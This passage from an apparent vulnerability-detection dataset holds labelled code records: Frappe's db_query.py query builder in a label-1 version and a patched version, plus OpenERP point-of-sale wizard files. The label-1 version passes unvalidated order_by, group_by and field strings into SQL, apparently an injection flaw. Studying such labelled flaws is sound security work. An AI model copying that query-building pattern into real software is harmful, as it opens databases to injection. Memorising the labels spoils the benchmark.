'name')\n\t\treturn frappe.db.sql(query, as_dict = (not self.as_list))\n\n\tdef set_order_by(self, args, meta):\n\t\tif self.order_by:\n\t\t\targs.order_by = self.order_by\n\t\telse:\n\t\t\targs.order_by = \"\"\n\n\t\t\t# don't add order by from meta if a mysql group function is used without group by clause\n\t\t\tgroup_function_without_group_by = (len(self.fields)==1 and\n\t\t\t\t(\tself.fields[0].lower().startswith(\"count(\")\n\t\t\t\t\tor self.fields[0].lower().startswith(\"min(\")\n\t\t\t\t\tor self.fields[0].lower().startswith(\"max(\")\n\t\t\t\t) and not self.group_by)\n\n\t\t\tif not group_function_without_group_by:\n\t\t\t\tsort_field = sort_order = None\n\t\t\t\tif meta.sort_field and ',' in meta.sort_field:\n\t\t\t\t\t# multiple sort given in doctype definition\n\t\t\t\t\t# Example:\n\t\t\t\t\t# `idx desc, modified desc`\n\t\t\t\t\t# will covert to\n\t\t\t\t\t# `tabItem`.`idx` desc, `tabItem`.`modified` desc\n\t\t\t\t\targs.order_by = ', '.join(['`tab{0}`.`{1}` {2}'.format(self.doctype,\n\t\t\t\t\t\tf.split()[0].strip(), f.split()[1].strip()) for f in meta.sort_field.split(',')])\n\t\t\t\telse:\n\t\t\t\t\tsort_field = meta.sort_field or 'modified'\n\t\t\t\t\tsort_order = (meta.sort_field and meta.sort_order) or 'desc'\n\n\t\t\t\t\targs.order_by = \"`tab{0}`.`{1}` {2}\".format(self.doctype, sort_field or \"modified\", sort_order or \"desc\")\n\n\t\t\t\t# draft docs always on top\n\t\t\t\tif meta.is_submittable:\n\t\t\t\t\targs.order_by = \"`tab{0}`.docstatus asc, {1}\".format(self.doctype, args.order_by)\n\n\tdef validate_order_by_and_group_by_params(self, parameters, meta):\n\t\t\"\"\"\n\t\t\tClause cases:\n\t\t\t\t1. check for . to split table and columns and check for `tab prefix\n\t\t\t\t2. elif check field in meta\n\t\t\"\"\"\n\t\tfor field in parameters.split(\",\"):\n\t\t\tif \".\" in field and field.startswith(\"`tab\"):\n\t\t\t\ttbl = field.split('.')[0]\n\t\t\t\tif tbl not in self.tables:\n\t\t\t\t\tif tbl.startswith('`'):\n\t\t\t\t\t\ttbl = tbl[4:-1]\n\t\t\t\t\tfrappe.throw(_(\"Please select atleast 1 column from {0} to sort\").format(tbl))\n\t\t\telse:\n\t\t\t\tfield = field.strip().split(' ')[0]\n\t\t\t\tif field not in [f.fieldname for f in meta.fields]:\n\t\t\t\t\tfrappe.throw(_(\"{0} invalid field in clause\").format(field))\n\n\tdef add_limit(self):\n\t\tif self.limit_page_length:\n\t\t\treturn 'limit %s, %s' % (self.limit_start, self.limit_page_length)\n\t\telse:\n\t\t\treturn ''\n\n\tdef add_comment_count(self, result):\n\t\tfor r in result:\n\t\t\tif not r.name:\n\t\t\t\tcontinue\n\n\t\t\tr._comment_count = 0\n\t\t\tif \"_comments\" in r:\n\t\t\t\tr._comment_count = len(json.loads(r._comments or \"[]\"))\n\n\tdef update_list_settings(self):\n\t\t# update list settings if new search\n\t\tlist_settings = json.loads(get_list_settings(self.doctype) or '{}')\n\t\tlist_settings['filters'] = self.filters\n\t\tlist_settings['limit'] = self.limit_page_length\n\t\tlist_settings['order_by'] = self.order_by\n\n\t\tif self.save_list_settings_fields:\n\t\t\tlist_settings['fields'] = self.list_settings_fields\n\n\t\tupdate_list_settings(self.doctype, list_settings)\n\n/n/n/n", "label": 0}, {"id": "049d51cdf17b06168b4fe7672be8ce01fff0edd2", "code": "/frappe/model/db_query.py/n/n# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors\n# MIT License. See license.txt\n\nfrom __future__ import unicode_literals\n\"\"\"build query for doclistview and return results\"\"\"\n\nimport frappe, json, copy\nimport frappe.defaults\nimport frappe.share\nimport frappe.permissions\nfrom frappe.utils import flt, cint, getdate, get_datetime, get_time, make_filter_tuple, get_filter, add_to_date\nfrom frappe import _\nfrom frappe.model import optional_fields\nfrom frappe.model.utils.list_settings import get_list_settings, update_list_settings\n\nclass DatabaseQuery(object):\n\tdef __init__(self, doctype):\n\t\tself.doctype = doctype\n\t\tself.tables = []\n\t\tself.conditions = []\n\t\tself.or_conditions = []\n\t\tself.fields = None\n\t\tself.user = None\n\t\tself.ignore_ifnull = False\n\t\tself.flags = frappe._dict()\n\n\tdef execute(self, query=None, fields=None, filters=None, or_filters=None,\n\t\tdocstatus=None, group_by=None, order_by=None, limit_start=False,\n\t\tlimit_page_length=None, as_list=False, with_childnames=False, debug=False,\n\t\tignore_permissions=False, user=None, with_comment_count=False,\n\t\tjoin='left join', distinct=False, start=None, page_length=None, limit=None,\n\t\tignore_ifnull=False, save_list_settings=False, save_list_settings_fields=False,\n\t\tupdate=None, add_total_row=None):\n\t\tif not ignore_permissions and not frappe.has_permission(self.doctype, \"read\", user=user):\n\t\t\traise frappe.PermissionError, self.doctype\n\n\t\t# fitlers and fields swappable\n\t\t# its hard to remember what comes first\n\t\tif (isinstance(fields, dict)\n\t\t\tor (isinstance(fields, list) and fields and isinstance(fields[0], list))):\n\t\t\t# if fields is given as dict/list of list, its probably filters\n\t\t\tfilters, fields = fields, filters\n\n\t\telif fields and isinstance(filters, list) \\\n\t\t\tand len(filters) > 1 and isinstance(filters[0], basestring):\n\t\t\t# if `filters` is a list of strings, its probably fields\n\t\t\tfilters, fields = fields, filters\n\n\t\tif fields:\n\t\t\tself.fields = fields\n\t\telse:\n\t\t\tself.fields =  [\"`tab{0}`.`name`\".format(self.doctype)]\n\n\t\tif start: limit_start = start\n\t\tif page_length: limit_page_length = page_length\n\t\tif limit: limit_page_length = limit\n\n\t\tself.filters = filters or []\n\t\tself.or_filters = or_filters or []\n\t\tself.docstatus = docstatus or []\n\t\tself.group_by = group_by\n\t\tself.order_by = order_by\n\t\tself.limit_start = 0 if (limit_start is False) else cint(limit_start)\n\t\tself.limit_page_length = cint(limit_page_length) if limit_page_length else None\n\t\tself.with_childnames = with_childnames\n\t\tself.debug = debug\n\t\tself.join = join\n\t\tself.distinct = distinct\n\t\tself.as_list = as_list\n\t\tself.ignore_ifnull = ignore_ifnull\n\t\tself.flags.ignore_permissions = ignore_permissions\n\t\tself.user = user or frappe.session.user\n\t\tself.update = update\n\t\tself.list_settings_fields = copy.deepcopy(self.fields)\n\t\t#self.debug = True\n\n\t\tif query:\n\t\t\tresult = self.run_custom_query(query)\n\t\telse:\n\t\t\tresult = self.build_and_run()\n\n\t\tif with_comment_count and not as_list and self.doctype:\n\t\t\tself.add_comment_count(result)\n\n\t\tif save_list_settings:\n\t\t\tself.save_list_settings_fields = save_list_settings_fields\n\t\t\tself.update_list_settings()\n\n\t\treturn result\n\n\tdef build_and_run(self):\n\t\targs = self.prepare_args()\n\t\targs.limit = self.add_limit()\n\n\t\tif args.conditions:\n\t\t\targs.conditions = \"where \" + args.conditions\n\n\t\tif self.distinct:\n\t\t\targs.fields = 'distinct ' + args.fields\n\n\t\tquery = \"\"\"select %(fields)s from %(tables)s %(conditions)s\n\t\t\t%(group_by)s %(order_by)s %(limit)s\"\"\" % args\n\n\t\treturn frappe.db.sql(query, as_dict=not self.as_list, debug=self.debug, update=self.update)\n\n\tdef prepare_args(self):\n\t\tself.parse_args()\n\t\tself.extract_tables()\n\t\tself.set_optional_columns()\n\t\tself.build_conditions()\n\n\t\targs = frappe._dict()\n\n\t\tif self.with_childnames:\n\t\t\tfor t in self.tables:\n\t\t\t\tif t != \"`tab\" + self.doctype + \"`\":\n\t\t\t\t\tself.fields.append(t + \".name as '%s:name'\" % t[4:-1])\n\n\t\t# query dict\n\t\targs.tables = self.tables[0]\n\n\t\t# left join parent, child tables\n\t\tfor child in self.tables[1:]:\n\t\t\targs.tables += \" {join} {child} on ({child}.parent = {main}.name)\".format(join=self.join,\n\t\t\t\tchild=child, main=self.tables[0])\n\n\t\tif self.grouped_or_conditions:\n\t\t\tself.conditions.append(\"({0})\".format(\" or \".join(self.grouped_or_conditions)))\n\n\t\targs.conditions = ' and '.join(self.conditions)\n\n\t\tif self.or_conditions:\n\t\t\targs.conditions += (' or ' if args.conditions else \"\") + \\\n\t\t\t\t ' or '.join(self.or_conditions)\n\n\t\tself.set_field_tables()\n\n\t\targs.fields = ', '.join(self.fields)\n\n\t\tself.set_order_by(args)\n\t\tself.check_sort_by_table(args.order_by)\n\t\targs.order_by = args.order_by and (\" order by \" + args.order_by) or \"\"\n\n\t\targs.group_by = self.group_by and (\" group by \" + self.group_by) or \"\"\n\n\t\treturn args\n\n\tdef parse_args(self):\n\t\t\"\"\"Convert fields and filters from strings to list, dicts\"\"\"\n\t\tif isinstance(self.fields, basestring):\n\t\t\tif self.fields == \"*\":\n\t\t\t\tself.fields = [\"*\"]\n\t\t\telse:\n\t\t\t\ttry:\n\t\t\t\t\tself.fields = json.loads(self.fields)\n\t\t\t\texcept ValueError:\n\t\t\t\t\tself.fields = [f.strip() for f in self.fields.split(\",\")]\n\n\t\tfor filter_name in [\"filters\", \"or_filters\"]:\n\t\t\tfilters = getattr(self, filter_name)\n\t\t\tif isinstance(filters, basestring):\n\t\t\t\tfilters = json.loads(filters)\n\n\t\t\tif isinstance(filters, dict):\n\t\t\t\tfdict = filters\n\t\t\t\tfilters = []\n\t\t\t\tfor key, value in fdict.iteritems():\n\t\t\t\t\tfilters.append(make_filter_tuple(self.doctype, key, value))\n\t\t\tsetattr(self, filter_name, filters)\n\n\tdef extract_tables(self):\n\t\t\"\"\"extract tables from fields\"\"\"\n\t\tself.tables = ['`tab' + self.doctype + '`']\n\n\t\t# add tables from fields\n\t\tif self.fields:\n\t\t\tfor f in self.fields:\n\t\t\t\tif ( not (\"tab\" in f and \".\" in f) ) or (\"locate(\" in f): continue\n\n\n\t\t\t\ttable_name = f.split('.')[0]\n\t\t\t\tif table_name.lower().startswith('group_concat('):\n\t\t\t\t\ttable_name = table_name[13:]\n\t\t\t\tif table_name.lower().startswith('ifnull('):\n\t\t\t\t\ttable_name = table_name[7:]\n\t\t\t\tif not table_name[0]=='`':\n\t\t\t\t\ttable_name = '`' + table_name + '`'\n\t\t\t\tif not table_name in self.tables:\n\t\t\t\t\tself.append_table(table_name)\n\n\tdef append_table(self, table_name):\n\t\tself.tables.append(table_name)\n\t\tdoctype = table_name[4:-1]\n\t\tif (not self.flags.ignore_permissions) and (not frappe.has_permission(doctype)):\n\t\t\traise frappe.PermissionError, doctype\n\n\tdef set_field_tables(self):\n\t\t'''If there are more than one table, the fieldname must not be ambigous.\n\t\tIf the fieldname is not explicitly mentioned, set the default table'''\n\t\tif len(self.tables) > 1:\n\t\t\tfor i, f in enumerate(self.fields):\n\t\t\t\tif '.' not in f:\n\t\t\t\t\tself.fields[i] = '{0}.{1}'.format(self.tables[0], f)\n\n\tdef set_optional_columns(self):\n\t\t\"\"\"Removes optional columns like `_user_tags`, `_comments` etc. if not in table\"\"\"\n\t\tcolumns = frappe.db.get_table_columns(self.doctype)\n\n\t\t# remove from fields\n\t\tto_remove = []\n\t\tfor fld in self.fields:\n\t\t\tfor f in optional_fields:\n\t\t\t\tif f in fld and not f in columns:\n\t\t\t\t\tto_remove.append(fld)\n\n\t\tfor fld in to_remove:\n\t\t\tdel self.fields[self.fields.index(fld)]\n\n\t\t# remove from filters\n\t\tto_remove = []\n\t\tfor each in self.filters:\n\t\t\tif isinstance(each, basestring):\n\t\t\t\teach = [each]\n\n\t\t\tfor element in each:\n\t\t\t\tif element in optional_fields and element not in columns:\n\t\t\t\t\tto_remove.append(each)\n\n\t\tfor each in to_remove:\n\t\t\tif isinstance(self.filters, dict):\n\t\t\t\tdel self.filters[each]\n\t\t\telse:\n\t\t\t\tself.filters.remove(each)\n\n\tdef build_conditions(self):\n\t\tself.conditions = []\n\t\tself.grouped_or_conditions = []\n\t\tself.build_filter_conditions(self.filters, self.conditions)\n\t\tself.build_filter_conditions(self.or_filters, self.grouped_or_conditions)\n\n\t\t# match conditions\n\t\tif not self.flags.ignore_permissions:\n\t\t\tmatch_conditions = self.build_match_conditions()\n\t\t\tif match_conditions:\n\t\t\t\tself.conditions.append(\"(\" + match_conditions + \")\")\n\n\tdef build_filter_conditions(self, filters, conditions):\n\t\t\"\"\"build conditions from user filters\"\"\"\n\t\tif isinstance(filters, dict):\n\t\t\tfilters = [filters]\n\n\t\tfor f in filters:\n\t\t\tif isinstance(f, basestring):\n\t\t\t\tconditions.append(f)\n\t\t\telse:\n\t\t\t\tconditions.append(self.prepare_filter_condition(f))\n\n\tdef prepare_filter_condition(self, f):\n\t\t\"\"\"Returns a filter condition in the format:\n\n\t\t\t\tifnull(`tabDocType`.`fieldname`, fallback) operator \"value\"\n\t\t\"\"\"\n\n\t\tf = get_filter(self.doctype, f)\n\n\t\ttname = ('`tab' + f.doctype + '`')\n\t\tif not tname in self.tables:\n\t\t\tself.append_table(tname)\n\n\t\tif 'ifnull(' in f.fieldname:\n\t\t\tcolumn_name = f.fieldname\n\t\telse:\n\t\t\tcolumn_name = '{tname}.{fname}'.format(tname=tname,\n\t\t\t\tfname=f.fieldname)\n\n\t\tcan_be_null = True\n\n\t\t# prepare in condition\n\t\tif f.operator in ('in', 'not in'):\n\t\t\tvalues = f.value\n\t\t\tif not isinstance(values, (list, tuple)):\n\t\t\t\tvalues = values.split(\",\")\n\n\t\t\tfallback = \"''\"\n\t\t\tvalue = (frappe.db.escape((v or '').strip(), percent=False) for v in values)\n\t\t\tvalue = '(\"{0}\")'.format('\", \"'.join(value))\n\t\telse:\n\t\t\tdf = frappe.get_meta(f.doctype).get(\"fields\", {\"fieldname\": f.fieldname})\n\t\t\tdf = df[0] if df else None\n\n\t\t\tif df and df.fieldtype in (\"Check\", \"Float\", \"Int\", \"Currency\", \"Percent\"):\n\t\t\t\tcan_be_null = False\n\n\t\t\tif f.operator=='Between' and \\\n\t\t\t\t(f.fieldname in ('creation', 'modified') or (df and (df.fieldtype==\"Date\" or df.fieldtype==\"Datetime\"))):\n\t\t\t\tvalue = \"'%s' AND '%s'\" % (\n\t\t\t\t\tget_datetime(f.value[0]).strftime(\"%Y-%m-%d %H:%M:%S.%f\"),\n\t\t\t\t\tadd_to_date(get_datetime(f.value[1]),days=1).strftime(\"%Y-%m-%d %H:%M:%S.%f\"))\n\t\t\t\tfallback = \"'0000-00-00 00:00:00'\"\n\t\t\telif df and df.fieldtype==\"Date\":\n\t\t\t\tvalue = getdate(f.value).strftime(\"%Y-%m-%d\")\n\t\t\t\tfallback = \"'0000-00-00'\"\n\n\t\t\telif df and df.fieldtype==\"Datetime\":\n\t\t\t\tvalue = get_datetime(f.value).strftime(\"%Y-%m-%d %H:%M:%S.%f\")\n\t\t\t\tfallback = \"'0000-00-00 00:00:00'\"\n\n\t\t\telif df and df.fieldtype==\"Time\":\n\t\t\t\tvalue = get_time(f.value).strftime(\"%H:%M:%S.%f\")\n\t\t\t\tfallback = \"'00:00:00'\"\n\n\t\t\telif f.operator in (\"like\", \"not like\") or (isinstance(f.value, basestring) and\n\t\t\t\t(not df or df.fieldtype not in [\"Float\", \"Int\", \"Currency\", \"Percent\", \"Check\"])):\n\t\t\t\t\tvalue = \"\" if f.value==None else f.value\n\t\t\t\t\tfallback = '\"\"'\n\n\t\t\t\t\tif f.operator in (\"like\", \"not like\") and isinstance(value, basestring):\n\t\t\t\t\t\t# because \"like\" uses backslash (\\) for escaping\n\t\t\t\t\t\tvalue = value.replace(\"\\\\\", \"\\\\\\\\\").replace(\"%\", \"%%\")\n\n\t\t\telse:\n\t\t\t\tvalue = flt(f.value)\n\t\t\t\tfallback = 0\n\n\t\t\t# put it inside double quotes\n\t\t\tif isinstance(value, basestring) and not f.operator=='Between':\n\t\t\t\tvalue = '\"{0}\"'.format(frappe.db.escape(value, percent=False))\n\n\t\tif (self.ignore_ifnull\n\t\t\tor not can_be_null\n\t\t\tor (f.value and f.operator in ('=', 'like'))\n\t\t\tor 'ifnull(' in column_name.lower()):\n\t\t\tcondition = '{column_name} {operator} {value}'.format(\n\t\t\t\tcolumn_name=column_name, operator=f.operator,\n\t\t\t\tvalue=value)\n\t\telse:\n\t\t\tcondition = 'ifnull({column_name}, {fallback}) {operator} {value}'.format(\n\t\t\t\tcolumn_name=column_name, fallback=fallback, operator=f.operator,\n\t\t\t\tvalue=value)\n\n\t\treturn condition\n\n\tdef build_match_conditions(self, as_condition=True):\n\t\t\"\"\"add match conditions if applicable\"\"\"\n\t\tself.match_filters = []\n\t\tself.match_conditions = []\n\t\tonly_if_shared = False\n\t\tif not self.user:\n\t\t\tself.user = frappe.session.user\n\n\t\tif not self.tables: self.extract_tables()\n\n\t\tmeta = frappe.get_meta(self.doctype)\n\t\trole_permissions = frappe.permissions.get_role_permissions(meta, user=self.user)\n\n\t\tself.shared = frappe.share.get_shared(self.doctype, self.user)\n\n\t\tif not meta.istable and not role_permissions.get(\"read\") and not self.flags.ignore_permissions:\n\t\t\tonly_if_shared = True\n\t\t\tif not self.shared:\n\t\t\t\tfrappe.throw(_(\"No permission to read {0}\").format(self.doctype), frappe.PermissionError)\n\t\t\telse:\n\t\t\t\tself.conditions.append(self.get_share_condition())\n\n\t\telse:\n\t\t\t# apply user permissions?\n\t\t\tif role_permissions.get(\"apply_user_permissions\", {}).get(\"read\"):\n\t\t\t\t# get user permissions\n\t\t\t\tuser_permissions = frappe.defaults.get_user_permissions(self.user)\n\t\t\t\tself.add_user_permissions(user_permissions,\n\t\t\t\t\tuser_permission_doctypes=role_permissions.get(\"user_permission_doctypes\").get(\"read\"))\n\n\t\t\tif role_permissions.get(\"if_owner\", {}).get(\"read\"):\n\t\t\t\tself.match_conditions.append(\"`tab{0}`.owner = '{1}'\".format(self.doctype,\n\t\t\t\t\tfrappe.db.escape(self.user, percent=False)))\n\n\t\tif as_condition:\n\t\t\tconditions = \"\"\n\t\t\tif self.match_conditions:\n\t\t\t\t# will turn out like ((blog_post in (..) and blogger in (...)) or (blog_category in (...)))\n\t\t\t\tconditions = \"((\" + \") or (\".join(self.match_conditions) + \"))\"\n\n\t\t\tdoctype_conditions = self.get_permission_query_conditions()\n\t\t\tif doctype_conditions:\n\t\t\t\tconditions += (' and ' + doctype_conditions) if conditions else doctype_conditions\n\n\t\t\t# share is an OR condition, if there is a role permission\n\t\t\tif not only_if_shared and self.shared and conditions:\n\t\t\t\tconditions =  \"({conditions}) or ({shared_condition})\".format(\n\t\t\t\t\tconditions=conditions, shared_condition=self.get_share_condition())\n\n\t\t\treturn conditions\n\n\t\telse:\n\t\t\treturn self.match_filters\n\n\tdef get_share_condition(self):\n\t\treturn \"\"\"`tab{0}`.name in ({1})\"\"\".format(self.doctype, \", \".join([\"'%s'\"] * len(self.shared))) % \\\n\t\t\ttuple([frappe.db.escape(s, percent=False) for s in self.shared])\n\n\tdef add_user_permissions(self, user_permissions, user_permission_doctypes=None):\n\t\tuser_permission_doctypes = frappe.permissions.get_user_permission_doctypes(user_permission_doctypes, user_permissions)\n\t\tmeta = frappe.get_meta(self.doctype)\n\n\t\tfor doctypes in user_permission_doctypes:\n\t\t\tmatch_filters = {}\n\t\t\tmatch_conditions = []\n\t\t\t# check in links\n\t\t\tfor df in meta.get_fields_to_check_permissions(doctypes):\n\t\t\t\tuser_permission_values = user_permissions.get(df.options, [])\n\n\t\t\t\tcondition = 'ifnull(`tab{doctype}`.`{fieldname}`, \"\")=\"\"'.format(doctype=self.doctype, fieldname=df.fieldname)\n\t\t\t\tif user_permission_values:\n\t\t\t\t\tcondition += \"\"\" or `tab{doctype}`.`{fieldname}` in ({values})\"\"\".format(\n\t\t\t\t\t\tdoctype=self.doctype, fieldname=df.fieldname,\n\t\t\t\t\t\tvalues=\", \".join([('\"'+frappe.db.escape(v, percent=False)+'\"') for v in user_permission_values])\n\t\t\t\t\t)\n\t\t\t\tmatch_conditions.append(\"({condition})\".format(condition=condition))\n\n\t\t\t\tmatch_filters[df.options] = user_permission_values\n\n\t\t\tif match_conditions:\n\t\t\t\tself.match_conditions.append(\" and \".join(match_conditions))\n\n\t\t\tif match_filters:\n\t\t\t\tself.match_filters.append(match_filters)\n\n\tdef get_permission_query_conditions(self):\n\t\tcondition_methods = frappe.get_hooks(\"permission_query_conditions\", {}).get(self.doctype, [])\n\t\tif condition_methods:\n\t\t\tconditions = []\n\t\t\tfor method in condition_methods:\n\t\t\t\tc = frappe.call(frappe.get_attr(method), self.user)\n\t\t\t\tif c:\n\t\t\t\t\tconditions.append(c)\n\n\t\t\treturn \" and \".join(conditions) if conditions else None\n\n\tdef run_custom_query(self, query):\n\t\tif '%(key)s' in query:\n\t\t\tquery = query.replace('%(key)s', 'name')\n\t\treturn frappe.db.sql(query, as_dict = (not self.as_list))\n\n\tdef set_order_by(self, args):\n\t\tmeta = frappe.get_meta(self.doctype)\n\t\tif self.order_by:\n\t\t\targs.order_by = self.order_by\n\t\telse:\n\t\t\targs.order_by = \"\"\n\n\t\t\t# don't add order by from meta if a mysql group function is used without group by clause\n\t\t\tgroup_function_without_group_by = (len(self.fields)==1 and\n\t\t\t\t(\tself.fields[0].lower().startswith(\"count(\")\n\t\t\t\t\tor self.fields[0].lower().startswith(\"min(\")\n\t\t\t\t\tor self.fields[0].lower().startswith(\"max(\")\n\t\t\t\t) and not self.group_by)\n\n\t\t\tif not group_function_without_group_by:\n\t\t\t\tsort_field = sort_order = None\n\t\t\t\tif meta.sort_field and ',' in meta.sort_field:\n\t\t\t\t\t# multiple sort given in doctype definition\n\t\t\t\t\t# Example:\n\t\t\t\t\t# `idx desc, modified desc`\n\t\t\t\t\t# will covert to\n\t\t\t\t\t# `tabItem`.`idx` desc, `tabItem`.`modified` desc\n\t\t\t\t\targs.order_by = ', '.join(['`tab{0}`.`{1}` {2}'.format(self.doctype,\n\t\t\t\t\t\tf.split()[0].strip(), f.split()[1].strip()) for f in meta.sort_field.split(',')])\n\t\t\t\telse:\n\t\t\t\t\tsort_field = meta.sort_field or 'modified'\n\t\t\t\t\tsort_order = (meta.sort_field and meta.sort_order) or 'desc'\n\n\t\t\t\t\targs.order_by = \"`tab{0}`.`{1}` {2}\".format(self.doctype, sort_field or \"modified\", sort_order or \"desc\")\n\n\t\t\t\t# draft docs always on top\n\t\t\t\tif meta.is_submittable:\n\t\t\t\t\targs.order_by = \"`tab{0}`.docstatus asc, {1}\".format(self.doctype, args.order_by)\n\n\tdef check_sort_by_table(self, order_by):\n\t\tif \".\" in order_by:\n\t\t\ttbl = order_by.split('.')[0]\n\t\t\tif tbl not in self.tables:\n\t\t\t\tif tbl.startswith('`'):\n\t\t\t\t\ttbl = tbl[4:-1]\n\t\t\t\tfrappe.throw(_(\"Please select atleast 1 column from {0} to sort\").format(tbl))\n\n\tdef add_limit(self):\n\t\tif self.limit_page_length:\n\t\t\treturn 'limit %s, %s' % (self.limit_start, self.limit_page_length)\n\t\telse:\n\t\t\treturn ''\n\n\tdef add_comment_count(self, result):\n\t\tfor r in result:\n\t\t\tif not r.name:\n\t\t\t\tcontinue\n\n\t\t\tr._comment_count = 0\n\t\t\tif \"_comments\" in r:\n\t\t\t\tr._comment_count = len(json.loads(r._comments or \"[]\"))\n\n\tdef update_list_settings(self):\n\t\t# update list settings if new search\n\t\tlist_settings = json.loads(get_list_settings(self.doctype) or '{}')\n\t\tlist_settings['filters'] = self.filters\n\t\tlist_settings['limit'] = self.limit_page_length\n\t\tlist_settings['order_by'] = self.order_by\n\n\t\tif self.save_list_settings_fields:\n\t\t\tlist_settings['fields'] = self.list_settings_fields\n\n\t\tupdate_list_settings(self.doctype, list_settings)\n\n/n/n/n", "label": 1}, {"id": "b48fb1cde6b7bbc49f502974a034ee1cf7e87e6c", "code": "addons/point_of_sale/wizard/pos_close_statement.py/n/n# -*- coding: utf-8 -*-\n##############################################################################\n#\n#    OpenERP, Open Source Management Solution\n#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).\n#\n#    This program is free software: you can redistribute it and/or modify\n#    it under the terms of the GNU Affero General Public License as\n#    published by the Free Software Foundation, either version 3 of the\n#    License, or (at your option) any later version.\n#\n#    This program is distributed in the hope that it will be useful,\n#    but WITHOUT ANY WARRANTY; without even the implied warranty of\n#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n#    GNU Affero General Public License for more details.\n#\n#    You should have received a copy of the GNU Affero General Public License\n#    along with this program.  If not, see <http://www.gnu.org/licenses/>.\n#\n##############################################################################\n\nfrom osv import osv\nfrom tools.translate import _\n\nclass pos_close_statement(osv.osv_memory):\n    _name = 'pos.close.statement'\n    _description = 'Close Statements'\n\n    def close_statement(self, cr, uid, ids, context):\n        \"\"\"\n             Close the statements\n             @param self: The object pointer.\n             @param cr: A database cursor\n             @param uid: ID of the user currently logged in\n             @param context: A standard dictionary\n             @return : Blank Dictionary\n        \"\"\"\n        company_id = self.pool.get('res.users').browse(cr, uid, uid).company_id.id\n        list_statement = []\n        mod_obj = self.pool.get('ir.model.data')\n        statement_obj = self.pool.get('account.bank.statement')\n        journal_obj = self.pool.get('account.journal')\n        cr.execute(\"\"\"select DISTINCT journal_id from pos_journal_users where user_id=%d order by journal_id\"\"\"%(uid))\n        j_ids = map(lambda x1: x1[0], cr.fetchall())\n        journal_ids = journal_obj.search(cr, uid, [('auto_cash', '=', True), ('type', '=', 'cash'), ('id', 'in', j_ids)])\n\n        for journal in journal_obj.browse(cr, uid, journal_ids):\n            ids = statement_obj.search(cr, uid, [('state', '!=', 'confirm'), ('user_id', '=', uid), ('journal_id', '=', journal.id)])\n            if not ids:\n                raise osv.except_osv(_('Message'), _('Journals are already closed'))\n            else:\n                list_statement.append(ids[0])\n                if not journal.check_dtls:\n                    statement_obj.button_confirm_cash(cr, uid, ids, context)\n\n        data_obj = self.pool.get('ir.model.data')\n        id2 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_tree')\n        id3 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_form2')\n        if id2:\n            id2 = data_obj.browse(cr, uid, id2, context=context).res_id\n        if id3:\n            id3 = data_obj.browse(cr, uid, id3, context=context).res_id\n        return {\n                'domain': \"[('id','in',\" + str(list_statement) + \")]\",\n                'name': 'Close Statements',\n                'view_type': 'form',\n                'view_mode': 'tree,form',\n                'res_model': 'account.bank.statement',\n                'views': [(id2, 'tree'),(id3, 'form')],\n                'type': 'ir.actions.act_window'}\n\npos_close_statement()\n\n# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:\n/n/n/naddons/point_of_sale/wizard/pos_open_statement.py/n/n# -*- coding: utf-8 -*-\n##############################################################################\n#\n#    OpenERP, Open Source Management Solution\n#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).\n#\n#    This program is free software: you can redistribute it and/or modify\n#    it under the terms of the GNU Affero General Public License as\n#    published by the Free Software Foundation, either version 3 of the\n#    License, or (at your option) any later version.\n#\n#    This program is distributed in the hope that it will be useful,\n#    but WITHOUT ANY WARRANTY; without even the implied warranty of\n#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n#    GNU Affero General Public License for more details.\n#\n#    You should have received a copy of the GNU Affero General Public License\n#    along with this program.  If not, see <http://www.gnu.org/licenses/>.\n#\n##############################################################################\n\nfrom osv import osv\nfrom tools.translate import _\nimport time\n\nclass pos_open_statement(osv.osv_memory):\n    _name = 'pos.open.statement'\n    _description = 'Open Statements'\n\n    def open_statement(self, cr, uid, ids, context):\n        \"\"\"\n             Open the statements\n             @param self: The object pointer.\n             @param cr: A database cursor\n             @param uid: ID of the user currently logged in\n             @param context: A standard dictionary\n             @return : Blank Directory\n        \"\"\"\n        list_statement = []\n        mod_obj = self.pool.get('ir.model.data')\n        company_id = self.pool.get('res.users').browse(cr, uid, uid).company_id.id\n        statement_obj = self.pool.get('account.bank.statement')\n        sequence_obj = self.pool.get('ir.sequence')\n        journal_obj = self.pool.get('account.journal')\n        cr.execute(\"\"\"select DISTINCT journal_id from pos_journal_users where user_id=%d order by journal_id\"\"\"%(uid))\n        j_ids = map(lambda x1: x1[0], cr.fetchall())\n        journal_ids = journal_obj.search(cr, uid, [('auto_cash', '=', True), ('type', '=', 'cash'), ('id', 'in', j_ids)])\n\n        for journal in journal_obj.browse(cr, uid, journal_ids):\n            ids = statement_obj.search(cr, uid, [('state', '!=', 'confirm'), ('user_id', '=', uid), ('journal_id', '=', journal.id)])\n            if len(ids):\n                raise osv.except_osv(_('Message'), _('You can not open a Cashbox for \"%s\". \\n Please close the cashbox related to. ' %(journal.name)))\n            \n            number = ''\n            if journal.sequence_id:\n                number = sequence_obj.get_id(cr, uid, journal.sequence_id.id)\n            else:\n                number = sequence_obj.get(cr, uid, 'account.bank.statement')\n            \n            statement_id = statement_obj.create(cr, uid, {'journal_id': journal.id,\n                                                          'company_id': company_id,\n                                                          'user_id': uid,\n                                                          'state': 'open',\n                                                          'name': number,\n                                                          'starting_details_ids': statement_obj._get_cash_close_box_lines(cr, uid, []),\n                                                      })\n            statement_obj.button_open(cr, uid, [statement_id], context)\n\n        data_obj = self.pool.get('ir.model.data')\n        id2 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_tree')\n        id3 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_form2')\n        if id2:\n            id2 = data_obj.browse(cr, uid, id2, context=context).res_id\n        if id3:\n            id3 = data_obj.browse(cr, uid, id3, context=context).res_id\n\n        return {\n            'domain': \"[('state','=','open')]\",\n            'name': 'Open Statement',\n            'view_type': 'form',\n            'view_mode': 'tree,form',\n            'res_model': 'account.bank.statement',\n            'views': [(id2, 'tree'),(id3, 'form')],\n            'type': 'ir.actions.act_window'\n}\npos_open_statement()\n\n# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:\n/n/n/n", "label": 0}, {"id": 